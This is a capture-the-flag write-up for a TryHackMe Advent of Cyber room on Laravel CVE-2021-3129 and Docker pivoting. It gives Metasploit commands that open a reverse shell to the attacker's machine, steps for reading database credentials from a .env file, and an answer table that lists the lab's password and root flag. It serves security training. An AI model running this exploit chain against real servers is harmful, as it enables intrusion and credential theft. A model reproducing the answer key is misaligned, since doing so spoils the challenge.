# Advent of Cyber 2022 - Day 9: Pivoting & Docker

{% embed url="https://tryhackme.com/room/adventofcyber4" %}

## Background
Exploiting a web application vulnerability (Laravel CVE-2021-3129), discovering you are trapped inside a Docker container, and pivoting into the internal host network.

## Walkthrough
1. Nmap scan reveals port 80 open, running the **Laravel** PHP framework (v8.4.2).
2. The application is vulnerable to **CVE-2021-3129** (Ignition debug mode deserialization RCE via `php://filter`).
3. Exploit with Metasploit:
   ```bash
   msfconsole -q
   use exploit/multi/http/laravel_ignition_rce
   set RHOSTS TARGET_IP
   set LHOST YOUR_VPN_IP
   run
   ```
4. Upgrade shell: `sessions -u -1`.
5. Checking for containerization:
   ```bash
   ls -la /.dockerenv
   cat /proc/1/cgroup
   ```
   `/.dockerenv` confirms we are inside a container.
6. Inspecting `/var/www/.env` reveals MySQL credentials:
   ```bash
   cat /var/www/.env
   # DB_USERNAME=root, DB_PASSWORD=p4$$w0rd
   ```
7. Dumping the database shows Santa's credentials in table `users`.
8. Scanning the internal Docker host network reveals the host running SSH and HTTP (`22,80`). Breaking out or accessing the host system yields the root flag: `THM{47C61A0FA8738BA77308A8A600F88E4B}`.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What ports are open on the external target? | `80` |
| What framework is the web application developed with? | `laravel` |
| What CVE is the application vulnerable to? | `CVE-2021-3129` |
| Command used to upgrade session to Meterpreter? | `sessions -u -1` |
| File indicating session is within a Docker container? | `/.dockerenv` |
| File containing database credentials? | `.env` |
| Database table containing user credentials? | `users` |
| What is Santa's password? | `p4$$w0rd` |
| What ports are open on the host machine? | `22,80` |
| What is the root flag? | `THM{47C61A0FA8738BA77308A8A600F88E4B}` |
